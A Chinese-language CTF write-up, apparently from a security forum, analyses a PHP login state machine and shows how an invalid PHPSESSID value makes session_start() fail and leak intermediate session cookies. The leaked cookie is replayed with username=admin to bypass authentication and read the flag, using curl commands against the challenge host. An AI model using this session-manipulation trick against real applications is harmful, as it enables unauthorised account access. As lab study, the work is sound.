
```
class Session
{
    public static $id = null;
    protected static $isInit = false;
    protected static $started = false;

    public static function start()
    {
        self::$isInit = true;
        if (!self::$started) {
            if (!is_null(self::$id)) {
                session_id(self::$id);
                self::$started = session_start();
            } else {
                self::$started = session_start();
                self::$id = session_id();
            }
        }
    }

    public static function stop()
    {
        if (self::$started) {
            session_write_close();
            self::$started = false;
        }
    }

    public static function destroy() {
        session_destroy();
    }

    public static function set($key, $value)
    {
        if (!isset($_SESSION) || self::get($key) == $value) {
            return;
        }
        if (!self::$started) {
            self::start();
            $_SESSION[$key] = $value;
            self::stop();
        } else {
            $_SESSION[$key] = $value;
        }
    }

    public static function get($key)
    {
        if (isset($_SESSION)) {
            return $_SESSION[$key];
        }
        return null;
    }

    public static function isInit()
    {
        return self::$isInit;
    }
}
```

这个`Session`类主要是封装了一些有关session的创建销毁及扩展了一些功能

至于在其下的`User`类的逻辑

存在有一个`__construct`这个魔术方法，在创建对象的时候将会进行调用

主要是从`users.txt`中读取账户

存在有`login`函数

```
function login($username, $password){
    $state = Session::get('state');
    if($state === 'connected' && Session::get('authenticated') === true) exit;
    if(method_exists($this,$state)){
        $this->$state($username, $password);
    } else {
        $this->start($username, $password);
    }
}
```

传入`username`和`password`参数，首先从session中获取`state`值，如果其为`connected`并且已经被认证了就会直接退出

对应的如果存在有从`state`中获得的方法，就会调用其方法

如果没有，就调用`start`函数

```
function start($username, $password) {
    // NOT IN USE FOR NOW
    Session::set('state', 'checkCreds');
    $this->login($username, $password);
}
```

他会创建一个`$_SESSION['state'] = checkCreds`，之后再次调用`login`方法，根据上面的描述将会调用`checkCreds`方法

```
function checkCreds($username, $password) {
    foreach($this->users as $user) {
        if($username === $user[0] && $password === $user[1]) {
            Session::set('state', 'credsValid');
            $this->login($username, $password);
            return;
        }
    }
    Session::set('state', 'error');
    $this->login($username, $password);
}
```

在这个方法中，进行了身份的校验，通过从`users.txt`中获取的账户对传入的参数`username`和`password`进行了判断，这里进行了强比较，所以也就不存在php的弱比较绕过了

如果不满足校验将创建一个`$_SESSION['state'] = error`，之后调用`login`方法，进而调用了`error`方法

```
function error($username, $password) {
    echo "Your login or password is incorrect, or you're banned :(";
    Session::destroy();
    return;
}
```

在`error`方法中将会销毁掉session并返回`null`

如果通过了前面的校验

就会创建一个`$_SESSION['state'] = credsValid`，之后再次调用`login`，进而调用了`credsValid`方法

```
function credsValid($username, $password) {
    Session::set('user', $username);
    Session::set('state', 'userState');
    $this->login($username, $password);
}
```

在这个方法中将会将传入的`username`参数创建一个`$_SESSION['user'] = $username`和`$_SESSION['state'] = 'userState'`，之后调用了`login`方法，进而调用了`userState`方法

```
function userState($username, $password) {
    if(in_array($username, $this->banlist)) {
        Session::set('user',null);
        Session::set('state','error');
        $this->login($username, $password);
        return;
    } else {
        Session::set('state', 'connected');
        $this->login($username, $password);
    }
}
```

如果传入的`username`参数在`banlist`名单中将会出现异常(有一说一，我感觉没有任何作用)

```
private $banlist = ['blackhat', 'notkindguy'];
```

如果不存在，就会调用`connected`方法

```
function connected($username, $password) {
    Session::set('authenticated',true);
    echo "Welcome $username, you're connected! Have a great day.";
}
```

赋予`$_SESSION['authenticated'] = true`

那么我们最后需要达到的目标就是

```
function getFlag() {
    if(Session::get('user') === 'admin' && Session::get('authenticated')) {
        echo file_get_contents('/flag.txt');
    } else {
        echo "No flag for you";
    }
}
```

不仅需要`username` 为 `admin`, 而且还是需要认证的`admin`才会得到flag

我们通过上面的分析似乎走进了死胡同，但是还是有可以突破的点

### 突破

我们通过上面的分析，相信我们能够注意到在`credsValid`方法中存在和我们传入参数进行交互的点

他在代码中将其传入给了session中的`user`值，如果我们能够在这一步使得传入的`username`为`admin`，是不是后面获取flag就是格外的轻松了呢？

那是直接传入`admin`还是有一个问题！

那就是调用`credsValid`方法之前还有一步通过调用了`checkCreds`判断了`username`和`password`的可用性

但是如果我们能够获取到`credsValid`那一步的cookie, 修改我们的cookie值在传入`username=admin`是不是就可以成功突破了呢？

基于这样的思路，我们翻阅`php manual`的文档

1cfK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2H3K9s2m8Q4x3X3g2F1k6i4c8Q4x3V1k6E0j5h3&6#2j5h3I4Q4x3V1k6W2L8W2)9J5c8X3k6#2L8X3y4@1K9h3!0F1i4K6u0W2M7$3g2K6M7$3W2G2L8W2)9J5k6r3W2V1i4K6u0W2M7r3S2H3

发现在这里存在有这样一段话

![](https://bbs.kanxue.com/upload/attach/202209/962655_CAN6B5F2DYFCA2V.png)

> If `id` is specified and not `null`, it will replace the current session id. `session_id()` needs to be called before [`session_start()`](https://bbs.kanxue.com/elink@a65K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2H3K9s2m8Q4x3X3g2F1k6i4c8Q4x3V1k6E0j5h3&6#2j5h3I4Q4x3V1k6W2L8W2)9J5c8X3k6#2L8X3y4@1K9h3!0F1i4K6u0W2M7$3g2K6M7$3W2G2L8W2)9J5k6s2y4@1j5i4u0@1i4K6u0W2M7r3S2H3) for that purpose. Depending on the session handler, not all characters are allowed within the session id. For example, the file session handler only allows characters in the range `a-z A-Z 0-9 , (comma) and - (minus)`!

在`session_id()`调用过程中不是所有的字符都能够存在于cookie中的

他只允许在`a-z A-Z 0-9 , -`等字符，如果我们使用特殊字符他是否会报错呢？报什么错？有什么危害？

它能够使得`session_start()`方法发生错误

我们可以尝试一下他的作用

```
curl '600K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5^5i4K6u0W2x3e0R3#2i4K6u0W2x3e0c8Q4x3X3f1J5x3o6u0Q4x3V1k6U0K9r3q4D9L8o6q4Q4x3V1k6A6L8X3c8W2P5q4)9J5k6i4m8Z5M7q4)9K6c8Y4m8S2k6$3g2Q4x3@1c8D9L8$3N6A6L8W2)9J5y4X3q4E0M7q4)9K6b7Y4g2K6k6i4u0F1j5h3#2W2i4K6y4p5N6i4y4W2M7W2)9J5y4X3q4E0M7q4)9K6b7Y4m8S2M7%4y4%4L8%4u0V1i4K6y4p5N6i4y4W2M7W2)9J5y4H3' -H 'Cookie: PHPSESSID=$' -v
```

![](https://bbs.kanxue.com/upload/attach/202209/962655_MEV6QFPETE4RGHE.png)

what's this !

我们居然得到了很多程序运行中set的cookie值，那么其中一个是否是我们需要的呢？

当然有！

```
curl '314K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5^5i4K6u0W2x3e0R3#2i4K6u0W2x3e0c8Q4x3X3f1J5x3o6u0Q4x3V1k6U0K9r3q4D9L8o6q4Q4x3V1k6A6L8X3c8W2P5q4)9J5k6i4m8Z5M7q4)9K6c8Y4m8S2k6$3g2Q4x3@1c8D9L8$3N6A6L8W2)9J5y4X3q4E0M7q4)9K6b7Y4g2K6k6i4u0F1j5h3#2W2i4K6y4p5j5h3c8E0K9h3&6Q4x3U0k6S2L8i4m8Q4x3@1u0H3j5i4y4K6N6$3!0J5k6q4)9K6c8o6p5J5x3#2)9J5y4H3' -H 'Cookie: PHPSESSID=ugr7im9314nhn283bse6j0gf4r' -v
```

![](https://bbs.kanxue.com/upload/attach/202209/962655_U4V4X9WKR7X5CHV.png)

成功登陆上了`admin`（中途刷新了一下cookie的，所以导致cookie不一样

之后就是通过这个cookie进行flag的获取

```
curl '75aK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5^5i4K6u0W2x3e0R3#2i4K6u0W2x3e0c8Q4x3X3f1J5x3o6u0Q4x3V1k6U0K9r3q4D9L8o6q4Q4x3V1k6A6L8X3c8W2P5q4)9J5k6i4m8Z5M7q4)9K6c8Y4m8S2k6$3g2Q4x3@1c8X3L8r3q4Y4i4K6t1%4' -H 'Cookie: PHPSESSID=ugr7im9314nhn283bse6j0gf4r' -v
```

![](https://bbs.kanxue.com/upload/attach/202209/962655_8HMHHB7VBC7P7FE.png)

那么为什么会产生这种错误呢，主要是因为没有对`PHPSESSID`的值进行校验，使得产生错误，执行了`Session`类的`stop`方法中的`session_write_close()`方法

## 总结

算是总结了关于php session利用的一个小trick
